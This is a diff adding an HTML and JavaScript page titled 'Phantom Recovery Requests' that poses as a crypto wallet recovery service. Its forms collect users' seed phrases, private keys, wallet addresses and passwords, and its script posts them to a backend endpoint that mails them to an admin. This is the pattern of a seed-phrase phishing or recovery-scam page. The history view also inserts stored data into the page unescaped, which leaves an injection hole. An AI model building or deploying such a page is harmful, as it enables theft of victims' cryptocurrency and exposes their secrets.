@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Phantom Recovery Requests</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+    min-height:100vh;
+    padding:1.5rem;
+    color:#f8fafc;
+    overflow-x:hidden;
+    position:relative;
+  }
+  .container{ max-width:1200px; margin:0 auto; position:relative; z-index:2;}
+  h1{text-align:center;font-size:2.2rem;margin-bottom:0.5rem;text-shadow:0 4px 20px rgba(0,0,0,0.3);}
+  .subtitle{text-align:center;margin-bottom:2rem;opacity:0.9;font-size:1rem;}
+
+  .nav-bar{
+    display:flex; justify-content:center; gap:1rem; margin-bottom:2rem;
+    flex-wrap:wrap; z-index:2; position:relative;
+  }
+  .nav-item{
+    padding:0.6rem 1.2rem; border-radius:0.7rem; cursor:pointer;
+    background: rgba(255,255,255,0.1); backdrop-filter: blur(20px);
+    border:1px solid rgba(124,58,237,0.3); color:#f8fafc; transition:0.3s;
+    font-weight:500; font-size:0.9rem;
+  }
+  .nav-item:hover{ background: rgba(255,255,255,0.15); transform:translateY(-2px); }
+  .nav-item.active{ background: linear-gradient(135deg,#7c3aed,#a855f7); border-color:#a855f7; box-shadow:0 8px 25px rgba(124,58,237,0.4); }
+
+  .tab-navigation{ display:flex; justify-content:center; gap:0.5rem; margin-bottom:1.5rem; flex-wrap:wrap; z-index:2; position:relative;}
+  .tab-btn { background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); border:1px solid rgba(124,58,237,0.3); color:#f8fafc; padding:0.6rem 1.2rem; border-radius:0.7rem; cursor:pointer; transition:0.3s; font-size:0.9rem;}
+  .tab-btn:hover{ background: rgba(255,255,255,0.15); transform:translateY(-2px);}
+  .tab-btn.active{ background: linear-gradient(135deg,#7c3aed,#a855f7); border-color:#a855f7; box-shadow:0 8px 25px rgba(124,58,237,0.4); }
+
+  .tab-content{ display:none; }
+  .tab-content.active{ display:block; animation:fadeIn 0.5s ease-in; }
+  @keyframes fadeIn{ from{opacity:0; transform:translateY(10px);} to{opacity:1; transform:translateY(0);} }
+
+  .recovery-section { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:1rem; margin-bottom:2rem; }
+  .recovery-card { background: rgba(255,255,255,0.08); backdrop-filter:blur(15px); border-radius:1rem; padding:1.5rem 1.2rem; transition:0.4s; border:1px solid rgba(124,58,237,0.2); position:relative; overflow:hidden;}
+  .recovery-card:hover{ transform:translateY(-4px) scale(1.02); box-shadow:0 20px 50px rgba(124,58,237,0.4);}
+  .recovery-card h3{ margin-bottom:0.8rem; color:#a855f7; font-size:1.3rem;}
+  .recovery-card>p{ margin-bottom:1rem; opacity:0.85; font-size:0.95rem; }
+
+  .form-group { margin-bottom:1rem; position:relative; }
+  .form-group label{ display:block; margin-bottom:0.3rem; font-weight:500; font-size:0.9rem; color:#e0e7ff; }
+  .form-group input, .form-group select, .form-group textarea{
+    background: rgba(255,255,255,0.08);
+    border:1px solid rgba(124,58,237,0.3);
+    border-radius:0.6rem;
+    padding:0.6rem;
+    color:#f8fafc;
+    width:100%;
+    font-family:inherit;
+    font-size:0.9rem;
+    transition:0.3s;
+  }
+  .form-group input:focus, .form-group select:focus, .form-group textarea:focus{
+    outline:none; border-color:#a855f7; box-shadow:0 0 10px rgba(168,85,247,0.5); background: rgba(255,255,255,0.12);
+  }
+  textarea{ resize: vertical; min-height:70px;}
+  .submit-btn{
+    background:linear-gradient(135deg,#7c3aed,#a855f7);
+    color:#fff; border:none; padding:0.7rem 1rem;
+    border-radius:0.7rem; cursor:pointer;
+    transition:0.3s; font-size:0.95rem; font-weight:600; width:100%;
+  }
+  .submit-btn:hover{ transform:scale(1.05); box-shadow:0 10px 25px rgba(124,58,237,0.5); }
+  .submit-btn:active{ transform:scale(0.98); }
+
+  @media(max-width:768px){
+    .recovery-section{ grid-template-columns:1fr; }
+    .nav-bar{ justify-content:space-around; }
+    h1{ font-size:1.8rem; }
+    .subtitle{ font-size:0.9rem; }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔐 Phantom Recovery Requests</h1>
+    <p class="subtitle">Submit and track your crypto recovery requests securely</p>
+
+<div class="nav-bar">
+  <a href="/dashboard" class="nav-item active">Dashboard</a>
+  <a href="/profile" class="nav-item">Profile</a>
+  <a href="/login" class="nav-item">Logout</a>
+</div>
+
+
+    <div class="tab-navigation">
+      <button class="tab-btn active" onclick="switchTab('recovery', event)">Recovery Requests</button>
+      <button class="tab-btn" onclick="switchTab('report', event)">Report a Case</button>
+      <button class="tab-btn" onclick="switchTab('history', event)">History & Tracking</button>
+    </div>
+
+    <!-- Recovery Requests Tab -->
+    <div id="recovery" class="tab-content active">
+      <div class="recovery-section">
+
+        <!-- Wallet Recovery -->
+        <div class="recovery-card">
+          <h3>💼 Wallet Recovery</h3>
+          <p>Recover lost or corrupted wallets using advanced cryptography.</p>
+          <form onsubmit="submitRecovery(event, 'Wallet Recovery')">
+            <div class="form-group">
+              <label>Seed Phrase / Private Key</label>
+              <input type="text" name="seedPhrase" placeholder="Enter seed phrase (12-24 words)" required>
+            </div>
+            <div class="form-group">
+              <label>Password Hint</label>
+              <input type="text" name="passwordHint" placeholder="Enter password hint (optional)">
+            </div>
+            <div class="form-group">
+              <label>Wallet Type</label>
+              <select name="walletType" required>
+                <option value="">Select wallet type</option>
+                <option>MetaMask</option>
+                <option>Trust Wallet</option>
+                <option>Ledger</option>
+                <option>Trezor</option>
+                <option>Exodus</option>
+                <option>Other</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Additional Notes</label>
+              <textarea name="notes" placeholder="Any additional information..."></textarea>
+            </div>
+            <button type="submit" class="submit-btn">Submit Wallet Recovery</button>
+          </form>
+        </div>
+
+        <!-- Lost Key Recovery -->
+        <div class="recovery-card">
+          <h3>🔑 Lost Key Recovery</h3>
+          <p>Restore access to lost private keys or keystore files.</p>
+          <form onsubmit="submitRecovery(event, 'Lost Key Recovery')">
+            <div class="form-group">
+              <label>Wallet Address</label>
+              <input type="text" name="walletAddress" placeholder="0x..." required>
+            </div>
+            <div class="form-group">
+              <label>Keystore File (if available)</label>
+              <input type="file" name="keystoreFile" accept=".json">
+            </div>
+            <div class="form-group">
+              <label>Hardware Wallet</label>
+              <input type="text" name="hardwareWallet" placeholder="Device type / model">
+            </div>
+            <div class="form-group">
+              <label>Last Known Password</label>
+              <input type="text" name="lastPassword" placeholder="Partial password or hint">
+            </div>
+            <button type="submit" class="submit-btn">Submit Key Recovery</button>
+          </form>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Report Tab -->
+    <div id="report" class="tab-content">
+      <div class="recovery-section">
+        <div class="recovery-card">
+          <h3>📢 Report a Case</h3>
+          <form>
+            <div class="form-group">
+              <label for="caseType">Case Type</label>
+              <select id="caseType" required>
+                <option value="">Select Type</option>
+                <option value="wallet">Wallet Recovery</option>
+                <option value="key">Lost Key</option>
+                <option value="fraud">Fraud / Scam</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="details">Details</label>
+              <textarea id="details" placeholder="Describe the issue..." required></textarea>
+            </div>
+            <div class="form-group">
+              <label for="email">Your Email</label>
+              <input type="email" id="email" placeholder="example@domain.com" required>
+            </div>
+            <button type="submit" class="submit-btn">Submit Request</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- History Tab -->
+    <div id="history" class="tab-content">
+      <div class="recovery-section">
+        <div class="recovery-card">
+          <h3>📊 Recovery & Reports History</h3>
+          <p>Track all past cases and requests.</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+<script>
+const API_BASE = "http://localhost:5000/api"; // Update if deployed
+
+// ------------------- Tabs -------------------
+function switchTab(tabName, event){
+  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+  document.getElementById(tabName).classList.add('active');
+  event.currentTarget.classList.add('active');
+  localStorage.setItem('activeTab', tabName);
+}
+
+// ------------------- Navigation -------------------
+function switchNav(el){
+  document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+  el.classList.add('active');
+}
+
+// ------------------- Submit Recovery -------------------
+async function submitRecovery(e, type){
+  e.preventDefault();
+  const form = e.target;
+
+  let payload = {};
+  if(type === "Wallet Recovery"){
+    payload = {
+      seed: form.seedPhrase?.value,
+      passwordHint: form.passwordHint?.value,
+      walletType: form.walletType?.value,
+      notes: form.notes?.value,
+      type,
+      user: "anonymous" 
+    };
+  } else if(type === "Lost Key Recovery"){
+    payload = {
+      keystore: form.keystoreFile?.files[0]?.name || "",
+      hardware: form.hardwareWallet?.value,
+      walletAddress: form.walletAddress?.value,
+      lastPassword: form.lastPassword?.value,
+      type,
+      user: "anonymous"
+    };
+  }
+
+  // Send to backend
+  const success = await sendRequest("/recovery/send-email", payload);
+  if(success){
+    alert(`${type} request sent to admin successfully!`);
+    form.reset();
+    loadHistory();
+  }
+}
+
+// ------------------- Send Request to Backend -------------------
+async function sendRequest(endpoint, payload){
+  try {
+    const res = await fetch(API_BASE + endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    if(!res.ok) throw new Error(data.message || "Request failed");
+    console.log("✅ Success:", data);
+    return true;
+  } catch(err) {
+    console.error("❌ Error:", err);
+    alert(`Error: ${err.message}`);
+    return false;
+  }
+}
+
+// ------------------- Load Recovery History -------------------
+async function loadHistory(){
+  try {
+    const res = await fetch(API_BASE + "/history");
+    const history = await res.json();
+    const container = document.getElementById("history").querySelector(".recovery-section");
+    container.innerHTML = "";
+
+    if(!history || history.length === 0){
+      container.innerHTML = "<p>No recovery requests found.</p>";
+      return;
+    }
+
+    history.forEach(r => {
+      const card = document.createElement("div");
+      card.className = "recovery-card";
+      card.innerHTML = `
+        <h3>${r.type}</h3>
+        <p>Status: ${r.status}</p>
+        <p>User: ${r.user}</p>
+        <p>Submitted At: ${new Date(r.submittedAt).toLocaleString()}</p>
+        <pre style="font-size:0.8rem;">Details: ${JSON.stringify(r.details,null,2)}</pre>
+      `;
+      container.appendChild(card);
+    });
+  } catch(err) {
+    console.error("❌ Failed to load history:", err);
+  }
+}
+
+// ------------------- Initialize -------------------
+document.addEventListener("DOMContentLoaded", () => {
+  const path = window.location.pathname;
+  document.querySelectorAll('.nav-item').forEach(nav => {
+    if(nav.getAttribute('href') === path) nav.classList.add('active');
+  });
+
+  const savedTab = localStorage.getItem('activeTab');
+  if(savedTab && document.getElementById(savedTab)){
+    const btn = document.querySelector(`.tab-btn[onclick*="${savedTab}"]`);
+    if(btn) switchTab(savedTab, {currentTarget: btn});
+  }
+
+  loadHistory();
+
+  document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', e => {
+      const type = form.querySelector('button[type="submit"]').innerText.includes("Wallet") 
+        ? "Wallet Recovery" 
+        : "Lost Key Recovery";
+      submitRecovery(e, type);
+    });
+  });
+});
+</script>
+</body>
+</html>
